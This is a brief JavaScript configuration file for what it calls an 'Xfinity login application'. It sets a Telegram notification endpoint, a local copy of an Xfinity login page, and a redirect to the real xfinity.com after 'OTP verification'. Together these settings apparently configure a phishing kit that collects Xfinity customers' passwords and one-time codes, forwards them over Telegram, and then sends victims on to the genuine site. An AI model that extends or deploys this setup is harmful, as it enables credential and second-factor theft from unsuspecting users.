/**
 * Application Configuration
 *
 * Centralized constants and settings for the Xfinity login application.
 */
export const config = {
  api: {
    // The endpoint for the Telegram notification API.
    sendTelegramEndpoint: '/api/sendTelegram',
  },
  redirects: {
    // The static Xfinity login landing page.
    landingPage: '/xfinity-login.html',
    // Where to redirect after OTP verification.
    afterOtp: 'https://www.xfinity.com',
  },
};
